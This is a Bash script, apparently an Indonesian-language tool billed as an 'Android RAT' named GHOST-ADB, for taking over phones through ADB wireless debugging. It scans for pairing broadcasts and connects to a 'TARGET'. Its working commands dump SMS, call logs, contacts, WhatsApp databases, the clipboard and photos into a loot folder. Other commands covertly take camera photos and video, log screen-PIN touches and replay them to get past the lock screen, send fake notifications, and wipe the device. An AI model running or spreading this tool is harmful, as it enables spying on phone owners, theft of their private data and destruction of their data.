#!/bin/bash

# =================================================================
# GHOST-ADB OMNIPOTENCE v44.5 (TOTAL FINAL EDITION)
# PONDASI: v42.1 (HUNTING EDITION) - TIDAK ADA FITUR DIHAPUS
# TAMBAHAN: Full Camera (Front/Back), Video, PIN Logger, Sound Prank
# =================================================================

RED="\e[1;31m"; GREEN="\e[1;32m"; YELLOW="\e[1;33m"
BLUE="\e[1;34m"; MAGENTA="\e[1;35m"; CYAN="\e[1;36m"
WHITE="\e[1;37m"; RESET="\e[0m"; BOLD="\e[1m"; GRAY="\e[1;90m"

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$BASE_DIR/.config_adb"; LOOT_DIR="$BASE_DIR/ADB_LOOT"
CACHE_FILE="$CONFIG_DIR/devices.cache"; TCP_CACHE="$CONFIG_DIR/tcp_ip.cache"
mkdir -p "$CONFIG_DIR" "$LOOT_DIR"

tput civis

# --- FITUR TAMBAHAN: ANTI-DISCONNECT (STAY ALIVE) ---
anti_disconnect() {
    if adb get-state 1>/dev/null 2>&1; then
        adb shell settings put global stay_on_while_plugged_in 3 >/dev/null 2>&1
        adb shell settings put system screen_off_timeout 1800000 >/dev/null 2>&1
        adb shell "device_config put activity_manager max_phantom_processes 2147483647" >/dev/null 2>&1
    fi
}

recon_target() {
    if adb get-state 1>/dev/null 2>&1; then
        MODEL=$(adb shell getprop ro.product.model 2>/dev/null | tr -d '\r')
        ANDROID_VER=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')
        BATT=$(adb shell dumpsys battery 2>/dev/null | grep "level" | awk '{print $2}' | tr -d '\r')
        PKGS=$(adb shell pm list packages 2>/dev/null)
        if echo "$PKGS" | grep -q "com.whatsapp.w4b"; then WA_TYPE="WA Business"; WA_PKG="com.whatsapp.w4b"
        elif echo "$PKGS" | grep -q "com.whatsapp"; then WA_TYPE="WA Standar"; WA_PKG="com.whatsapp"
        else WA_TYPE="N/A"; WA_PKG=""; fi
        if adb shell su -c 'id' >/dev/null 2>&1; then ROOT_S="${GREEN}ROOTED${RESET}"; else ROOT_S="${RED}NON-ROOT${RESET}"; fi
        CONNECTED=true
    else
        CONNECTED=false
    fi
}

header() {
    tput reset
    recon_target # Update info perangkat
    
    echo -e "${RED}${BOLD}"
    # Baris 1-3: Kosongkan sampingnya agar teks tidak terlalu ke atas
    echo -e "           uuuuuuu             "
    echo -e "       uu\$\$\$\$\$\$\$\$\$\$\$uu         "
    echo -e "    uu\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$uu      "
    
    # Baris 4-7: Mulai isi teks di samping (Sejajar Tengah)
    echo -e "   u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u      ${BLUE}[GHOST-ADB]${RED}"
    echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${RED}[Android RAT]${RED}"
    echo -e "  u\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$u     ${YELLOW}[Tools BY:Sneijderlino]${RED}"
    echo -e "  u\$\$\$\$\$\$\"   \"\$\$\$\"   \"\$\$\$\$u     ${GREEN}──────────────────────${RED}"
    
    # Baris 8 ke bawah: Sisa gambar tengkorak
    echo -e "  \"\$\$\$\$\"      u\$u       \"\$\$\$\"   "   

    echo -e "   \$\$\$u       u\$u       u\$\$\$    "                                                  
    echo -e "   \$\$\$u      u\$\$\$u      u\$\$\$    "                                            
    echo -e "    \"\$\$\$\$uu\$\$\$   \$\$\$uu\$\$\$\$\"    "
    echo -e "     \"\$\$\$\$\$\$\$\"   \"\$\$\$\$\$\$\$\"    "
    echo -e "       u\$\$\$\$\$\$\$u\$\$\$\$\$\$\$u       "
    echo -e "        u\$\"\$\"\$\"\$\"\$\"\$\"\$u        "
    echo -e "         \$\$u\$u\$u\$u\$u\$\$         "
    echo -e "          \$\$\$\$\$\$\$\$\$\$\$          "
    echo -e "           \"\$\$\$\$\$\$\$\"           "
    
    # Bagian Status Perangkat (Garis Bawah)
    echo -e "${GREEN}  ════════════════════════════════════════════════════════${RESET}"
    if [ "$CONNECTED" = true ]; then
        echo -e "   TARGET : ${CYAN}$MODEL (A$ANDROID_VER)${RESET} | $ROOT_S"
        echo -e "   POWER  : ${GREEN}$BATT%${RESET} | WA: ${YELLOW}$WA_TYPE${RESET}"
    else
        echo -e "   ${RED}${BOLD}    [ ○ ] MENUNGGU PERANGKAT TERHUBUNG... [ ○ ]${RESET}"
    fi
    echo -e "${GREEN}  ════════════════════════════════════════════════════════${RESET}"
}
auto_connect() {
    echo -e "${YELLOW}[*] Memulai Mode Hunting...${RESET}"
    echo -e "${GRAY}(Tekan CTRL+C untuk membatalkan)${RESET}"
    while true; do
        echo -ne "${YELLOW}[#] Mencari sinyal HP... \r${RESET}"
        TARGET=$(avahi-browse -t -r _adb-tls-pairing._tcp --parsable 2>/dev/null | grep "=" | head -n 1)
        if [ ! -z "$TARGET" ]; then
            echo -e "\n${GREEN}[+] HP DITEMUKAN!${RESET}"
            T_IP=$(echo "$TARGET" | cut -d';' -f7); P_PORT=$(echo "$TARGET" | cut -d';' -f9)
            echo -e "${CYAN}[>] IP Target: $T_IP:$P_PORT${RESET}"
            tput cnorm; read -p ">>> MASUKKAN 6 DIGIT KODE: " P_CODE; tput civis
            echo -e "${BLUE}[*] Pairing ke $T_IP:$P_PORT...${RESET}"
            echo "$P_CODE" | adb pair "$T_IP:$P_PORT"
            sleep 2
            D_PORT=$(avahi-browse -t -r _adb-tls-connect._tcp --parsable 2>/dev/null | grep "=" | head -n 1 | cut -d';' -f9)
            if [ ! -z "$D_PORT" ]; then
                echo -e "${GREEN}[+] Menghubungkan ke Debug Port: $D_PORT${RESET}"
                adb connect "$T_IP:$D_PORT"
                echo "$T_IP:$D_PORT" > "$CACHE_FILE"; echo "$T_IP" > "$TCP_CACHE"
                anti_disconnect
                scrcpy --always-on-top --window-title "GHOST-CONTROL"
                break
            fi
        fi
        sleep 1
    done
}

trap 'tput cnorm; exit' INT

menu_otomatis() {
    anti_disconnect
    while true; do
        recon_target; header
        echo -e " ${CYAN}[ INTEL & EXTRACTION ]${RESET}      ${CYAN}[ MANIPULATION ]${RESET}"
        echo -e "  1. Sedot SMS                15. Paksa Buka WA"
        echo -e "  2. Sedot Call Log           16. Ketik Pesan WA"
        echo -e "  3. Sedot Kontak             21. Buka Link Browser"
        echo -e "  5. Daftar Apps              24. Putar Musik (URL)"
        echo -e "  6. DB WhatsApp (Root/SD)    27. Kirim Pesan Toast"
        echo -e "  12. Curi Clipboard          28. Getarkan HP (5s)"
        echo -e "  13. Info Baterai Detail     29. Paksa Nonton YT (ID)"
        echo -e "  14. Lokasi Maps (Lat,Long)  45. Kirim Notif Palsu"
        echo -e ""
        echo -e " ${CYAN}[ CAMERA & PIN LOGGER ]${RESET}     ${CYAN}[ SYSTEM TORTURE ]${RESET}"
        echo -e "  c1. Foto Kamera Depan       35. Mirror Scrcpy"
        echo -e "  c2. Foto Kamera Belakang    37. Injeksi Keyboard"
        echo -e "  c3. Rekam Video Depan       40. Ganti Wallpaper"
        echo -e "  c4. Rekam Video Belakang    41. 🔊 Mainkan Alarm (Max)"
        echo -e "  32. Buka Kamera (Live)      42. 👻 Kirim & Putar MP3"
        echo -e "  p1. 🔴 Rekam PIN (Logger)   43. 🔇 Stop Semua Suara"
        echo -e "  p2. 🟢 Replay PIN (Bypass)  48. Spam Tombol Back"
        echo -e ""
        echo -e " ${CYAN}[ MULTIMEDIA ]${RESET}              ${CYAN}[ POWER ]${RESET}"
        echo -e "  25. Screenshot              50. Power Off"
        echo -e "  26. ScreenRecord            51. Reboot"
        echo -e "  30. Sedot Galeri            53. Senter"
        echo -e "  31. Sedot Download          54. WIPE ALL DATA"
        echo -e ""
        echo -e " ${WHITE}0. KEMBALI KE MENU UTAMA${RESET}"
        tput cnorm; read -p " ghost@kali-neraka › " OPT; tput civis

        [ "$OPT" = "0" ] && break
        DIR_NAME="${MODEL// /_}_$(date +%Y%m%d)"
        FINAL_LOOT="$LOOT_DIR/$DIR_NAME"; mkdir -p "$FINAL_LOOT"

        case $OPT in
            1) adb shell content query --uri content://sms/ > "$FINAL_LOOT/sms.txt" ;;
            2) adb shell content query --uri content://call_log/calls > "$FINAL_LOOT/calls.txt" ;;
            3) adb shell content query --uri content://com.android.contacts/data > "$FINAL_LOOT/kontak.txt" ;;
            5) adb shell pm list packages -f > "$FINAL_LOOT/apps_list.txt" ;;
            6) adb pull /sdcard/WhatsApp/Databases/ "$FINAL_LOOT/WA_DB/" ;;
            12) adb shell service call clipboard 2 ;;
            13) adb shell dumpsys battery ;;
            14) read -p "Lat,Long: " LOC; adb shell am start -a android.intent.action.VIEW -d "geo:$LOC" ;;
            15) [ ! -z "$WA_PKG" ] && adb shell monkey -p $WA_PKG 1 ;;
            16) read -p "No: " N; read -p "Msg: " M; MSG_U="${M// /%20}"; adb shell am start -a android.intent.action.VIEW -d "https://wa.me/$N?text=$MSG_U" ;;
            21) read -p "URL: " URL; adb shell am start -a android.intent.action.VIEW -d "$URL" ;;
            24) read -p "Audio Link: " AUD; adb shell am start -a android.intent.action.VIEW -d "$AUD" -t "audio/*" ;;
            25) TS=$(date +%H%M%S); adb shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png "$FINAL_LOOT/scr_$TS.png" ;;
            26) adb shell screenrecord --time-limit 15 /sdcard/r.mp4 && adb pull /sdcard/r.mp4 "$FINAL_LOOT/" ;;
            27) read -p "Pesan: " T; adb shell "am broadcast -a com.android.systemui.demo -e command toast -e text '$T'" ;;
            28) adb shell cmd vibrator vibrate 5000 ;;
            29) read -p "YouTube Video ID: " YID; adb shell am start -a android.intent.action.VIEW "vnd.youtube:$YID" ;;
            30) adb pull /sdcard/DCIM/Camera/ "$FINAL_LOOT/Photos/" ;;
            31) adb pull /sdcard/Download/ "$FINAL_LOOT/" ;;
            32) adb shell am start -a android.media.action.IMAGE_CAPTURE ;;
            35) scrcpy --always-on-top ;;
            37) read -p "Teks: " T; T_E="${T// /%s}"; adb shell input text "$T_E" ;;
            40) read -p "Img Link: " IMG; adb shell am start -a android.intent.action.ATTACH_DATA -d "$IMG" -t "image/*" ;;
            41) for i in {1..15}; do adb shell input keyevent 24; done; adb shell am start -a android.intent.action.VIEW -d "content://settings/system/alarm_alert" -t "audio/*" ;;
            42) read -p "Path MP3 di PC: " MP; adb push "$MP" /sdcard/g.mp3; adb shell am start -a android.intent.action.VIEW -d "file:///sdcard/g.mp3" -t "audio/mp3" ;;
            43) adb shell am force-stop com.android.music; adb shell input keyevent 127 ;;
            48) for i in {1..15}; do adb shell input keyevent 4; sleep 0.1; done ;;
            50) adb shell reboot -p ;;
            51) adb shell reboot ;;
            53) adb shell "su -c 'echo 255 > /sys/class/leds/flashlight/brightness'" ;;
            54) echo -e "${RED}WIPE DATA? (y/n)${RESET}"; read -p "> " Y; [ "$Y" == "y" ] && adb shell am broadcast -a android.intent.action.MASTER_CLEAR ;;
            
            # --- TAMBAHAN COMMAND BARU ---
            c1) adb shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true; sleep 2; adb shell input keyevent 27 ;;
            c2) adb shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA false; sleep 2; adb shell input keyevent 27 ;;
            c3) adb shell am start -a android.media.action.VIDEO_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true; sleep 2; adb shell input keyevent 27 ;;
            c4) adb shell am start -a android.media.action.VIDEO_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA false; sleep 2; adb shell input keyevent 27 ;;
            p1) TS_DEV=$(adb shell getevent -p | grep -B 5 "ABS_MT_POSITION_X" | grep "add device" | awk '{print $NF}' | head -n 1); echo -e "${RED}[!] REKAM PIN AKTIF. CTRL+C JIKA SELESAI.${RESET}"; adb shell getevent -lt $TS_DEV | grep --line-buffered "ABS_MT_POSITION" > "$CONFIG_DIR/pin.log" ;;
            p2) while read p; do X=$(echo $p | grep "X" | awk '{print $NF}' | xargs printf "%d\n" 2>/dev/null); Y=$(echo $p | grep "Y" | awk '{print $NF}' | xargs printf "%d\n" 2>/dev/null); [ ! -z "$X" ] && [ ! -z "$Y" ] && adb shell input tap $X $Y; done < "$CONFIG_DIR/pin.log" ;;
        esac
        echo -e "\n${GREEN}[ DONE ]${RESET} - Press Enter..."; read
    done
}

while true; do
    recon_target; header
    echo -e " 1) ⚡ CONNECT CACHE       5) 🔄 RESET ADB"
    echo -e " 2) 🔐 PAIRING MANUAL      6) 📡 SWITCH TCP 5555"
    echo -e " 3) 💀 GHOST COMMANDS      7) 🔗 CONNECT DIRECT TCP"
    echo -e " 4) 🐚 MANUAL VOID SHELL   8) 🚀 ${CYAN}START HUNTING (AUTO-SCAN)${RESET}"
    echo -e " q) EXIT"
    tput cnorm; read -p " ghost@kali-neraka › " M; tput civis
    case $M in
        1) T=$(tail -n 1 "$CACHE_FILE" 2>/dev/null); [ ! -z "$T" ] && adb connect "$T" ;;
        2) read -p "IP: " IP; read -p "P-Port: " PP; read -p "Code: " PC; read -p "D-Port: " DP
           echo "$PC" | adb pair "$IP:$PP" && adb connect "$IP:$DP"
           echo "$IP:$DP" > "$CACHE_FILE"; echo "$IP" > "$TCP_CACHE" ;;
        3) [ "$CONNECTED" = true ] && menu_otomatis || echo -e "${RED}[!] TARGET BELUM KONEK!${RESET}"; sleep 1 ;;
        4) adb shell ;;
        5) adb kill-server && adb start-server ;;
        6) adb tcpip 5555 ;;
        7) R_IP=$(cat "$TCP_CACHE" 2>/dev/null); adb connect "$R_IP:5555" ;;
        8) auto_connect ;;
        q) tput cnorm; exit 0 ;;
    esac
done
